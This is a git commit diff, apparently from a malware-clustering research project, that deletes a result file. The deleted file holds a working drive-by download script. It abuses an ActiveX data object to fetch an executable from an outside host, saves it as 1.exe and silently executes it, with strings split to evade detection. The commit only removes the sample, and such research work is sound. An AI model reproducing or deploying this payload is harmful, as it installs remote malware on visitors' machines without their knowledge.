d09f2c1cdc034aa49e4c36251ce2857987a6f90b
Hongtao  Li <hongtao.li14@imperial.ac.uk>
2018-05-05 16:32:53 +0100

    remove result files in git

--- Clustering/cluster_result/390/161.js
+++
@@ -1,9 +0,0 @@
-<iframe src=*></iframe> 
-</noscript>
-<script language="JavaScript">
-<!--
-document.write("<script>var ailian,exeqq;ailian=\"http://www.859l.com.tw/explorer/DirectX.exe\";exeqq=\"1.exe\";try{var ado=(document.createElement(\"object\"));var d=1;m1=\"classid\",m2=\"clsid:BD96C556-65A3-11D0-983A-00C04FC29E36\",ado.setAttribute(m1,m2);var e=1;var xml=ado.CreateObject(\"Microsoft.XMLHTTP\",\"\");var f=1;var ln=\"Ado\";var lzn=\"db.St\";var an=\"ream\";var g=1;var as=ado.createobject(ln+lzn+an,\"\");var h=1;xml.Open(\"GET\",ailian,0);xml.Send();as.type=1;var n=1;as.open();as.write(xml.responseBody);as.savetofile(exeqq,1);as.close();var shell=ado.createobject(\"Shell.Application\",\"\");shell.Shellexecute(exeqq,\"\",\"\",\"open\",0);}catch(e){};</script\>");
-//-->
-</script>
-<script type="text/jscript">function init() { document.write("WRITEING");}window.onload = init;</script>
-
